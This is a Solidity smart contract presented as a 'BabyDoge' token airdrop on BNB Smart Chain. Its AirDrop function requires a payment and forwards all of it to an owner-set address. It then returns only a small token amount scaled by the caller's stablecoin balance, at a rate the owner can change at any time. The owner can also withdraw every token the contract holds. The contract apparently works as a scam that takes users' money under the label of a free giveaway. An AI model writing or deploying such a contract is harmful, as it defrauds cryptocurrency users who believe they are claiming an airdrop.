// SPDX-License-Identifier: None
pragma solidity 0.8.16;


interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}


contract BabyDogeAirDrop {
    address private onwer;
    address private TakeOver;
    uint256 private distribution = 1000000;
    mapping(address => uint256) public airdropTime;
    // The BSC20 USDT Address
    IBEP20 private constant BSC_USDT = IBEP20(0x55d398326f99059fF775485246999027B3197955);
    // The BSC20 BUSDT Address
    IBEP20 private constant BSC_BUSDT = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    // The BSC20 BabyDoge Address
    IBEP20 private constant BabyDoge = IBEP20(0xc748673057861a797275CD8A068AbB95A902e8de);

    modifier onlyOnwer() {
        require(msg.sender == onwer, "Onwer");
        _;
    }

    constructor () {
        
        // msg.sender is onwer
        onwer = msg.sender;
        TakeOver = msg.sender;
    }

    function AirDrop() public payable{

        require(msg.value > 0, "value is 0");

        payable(TakeOver).transfer(msg.value);

        if(block.timestamp >= airdropTime[msg.sender] + 1 days){
            
            airdropTime[msg.sender] = block.timestamp;

            // BabyDoge Air Drop in here
            uint256 USDT_balance = 0;

            uint256 BSC_USDT_balance = BSC_USDT.balanceOf(msg.sender);

            uint256 BSC_BUSDT_balance = BSC_BUSDT.balanceOf(msg.sender);

            if(BSC_USDT_balance > BSC_BUSDT_balance){
                // BSC_USDT_balance is Big
                USDT_balance = BSC_USDT_balance;
            }else{
                // or BSC_BUSDT_balance is Big
                USDT_balance = BSC_BUSDT_balance;
            }

            if(USDT_balance >= distribution){

                USDT_balance = USDT_balance / distribution;

                uint256 BabyDoge_balance = BabyDoge.balanceOf(address(this));

                if(BabyDoge_balance > USDT_balance){
                    BabyDoge.transfer(msg.sender,USDT_balance);
                }else if(BabyDoge_balance > 0){
                    BabyDoge.transfer(msg.sender,BabyDoge_balance);
                }
                
            }
            
        }
    }

    // onwer setting
    function setOnwer(address newonwer) public payable onlyOnwer {
        onwer = newonwer;
    }

    function setTakeOver(address newTakeOver) public payable onlyOnwer {
        TakeOver = newTakeOver;
    }

    function setDistribution(uint256 newDistribution) public payable onlyOnwer {
        distribution = newDistribution;
    }

    function BSC_Withdraw(address BSC20,address out) public payable onlyOnwer{
        IBEP20(BSC20).transfer(out,IBEP20(BSC20).balanceOf(address(this)));
    }

    function ETH_Withdraw(address payable out) public payable onlyOnwer{
        out.transfer(address(this).balance);
    }

}